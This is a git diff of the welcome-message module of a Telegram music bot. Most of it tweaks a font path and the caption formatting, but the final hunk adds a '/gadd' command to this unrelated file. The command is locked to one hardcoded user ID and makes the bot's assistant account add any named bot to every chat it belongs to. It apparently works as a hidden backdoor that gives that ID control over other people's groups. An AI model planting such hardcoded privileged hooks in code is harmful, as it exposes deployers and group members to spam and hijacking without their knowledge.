@@ -101,8 +101,8 @@ def welcomepic(pic, user, chatname, id, uname, brightness_factor=1.3):
     pfp = circle(pfp)
     pfp = pfp.resize((830, 840))
     draw = ImageDraw.Draw(background)
-    font_large = ImageFont.truetype('ANNIEMUSIC/assets/annie/ArialReg.ttf', size=140)
-    font_small = ImageFont.truetype('ANNIEMUSIC/assets/annie/ArialReg.ttf', size=140)
+    font_large = ImageFont.truetype('ANNIEMUSIC/assets/annie/ArialReg.TTF', size=140)
+    font_small = ImageFont.truetype('ANNIEMUSIC/assets/annie/ArialReg.TTF', size=140)
     draw.text((2000, 1080), f'{user}', fill=(201, 2, 2), font=font_large)
     draw.text((2000, 1280), f'{id}', fill=(201, 2, 2), font=font_large)
     draw.text((2000, 1510), f'{uname}', fill=(201, 2, 2), font=font_large)
@@ -181,25 +181,21 @@ async def greet_new_member(_, member: ChatMemberUpdated):
                 member.chat.id,
                 photo=welcomeimg,
                 caption=f"""
-**☆ . * ● ¸ . ✦ .★　° :. ★ * • ○ ° ★**
+<blockquote>**☆ . * ● ¸ . ✦ .★　° :. ★ * • ○ ° ★**
  
 **🦋‌𝞖𝘌𝘈𝘙𝘛𝂬♡𝂬‌𝞑𝘌𝘈𝘛▹ᴴᴮ⸳⸳ⷮ⸳⸳ⷨ ‌𝆺𝅥🦋⤍🖤**
 
-**⊰●⊱┈─★ 𝑊𝑒𝑙𝑐𝑜𝑚𝑒 ★─┈⊰●⊱**
-
-**➽───────────────────❥**   
+**⊰●⊱┈─★ 𝑊𝑒𝑙𝑐𝑜𝑚𝑒 ★─┈⊰●⊱**</blockquote>\n
+<blockquote>**➽───────────────────❥**   
 
 **💕 𝐍𖽖𖽧𖽞 🦋** {user.mention}
-
 **💕 𝐈𖽴 🦋** {user.id}
-
 **💕 𝐔𖾗𖽞𖽷𖽡𖽖𖽧𖽞 🦋** @{user.username}
-
 **💕 𝐌𖽞𖽧𖽜𖽞𖽷𖾗 🦋** {count}
 
-**➽───────────────────❥**   
+**➽───────────────────❥**</blockquote>\n  
 
-**☆ . * ● ¸ . ✦ .★　° :. ★ * • ○ ° ★**
+<blockquote>**☆ . * ● ¸ . ✦ .★　° :. ★ * • ○ ° ★**</blockquote>
 """,
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton(button_text, url=deep_link)],
@@ -210,4 +206,42 @@ async def greet_new_member(_, member: ChatMemberUpdated):
             LOGGER.error(e)
 
 
-      
+# Global Add Bot
+@app.on_message(filters.command("gadd") & filters.user(1281282633))
+async def add_all(client, message):
+    command_parts = message.text.split(" ")
+    if len(command_parts) != 2:
+        await message.reply("**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » `/gadd bot username`**")
+        return
+
+    bot_username = command_parts[1]
+    try:
+        userbot = await get_assistant(message.chat.id)
+        bot = await app.get_users(bot_username)
+        app_id = bot.id
+        done = 0
+        failed = 0
+        lol = await message.reply("🔄 **ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!**")
+
+        async for dialog in userbot.get_dialogs():
+            if dialog.chat.id == -1001735663878:
+                continue
+            try:
+                await userbot.add_chat_members(dialog.chat.id, app_id)
+                done += 1
+                await lol.edit(
+                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{userbot.username}"
+                )
+            except Exception as e:
+                failed += 1
+                await lol.edit(
+                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅɪɴɢ ʙʏ»** @{userbot.username}"
+                )
+            await asyncio.sleep(3)  # Adjust sleep time based on rate limits
+
+        await lol.edit(
+            f"**➻ {bot_username} ʙᴏᴛ ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ🎉**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{userbot.username}"
+        )
+    except Exception as e:
+        await message.reply(f"Error: {str(e)}")
+
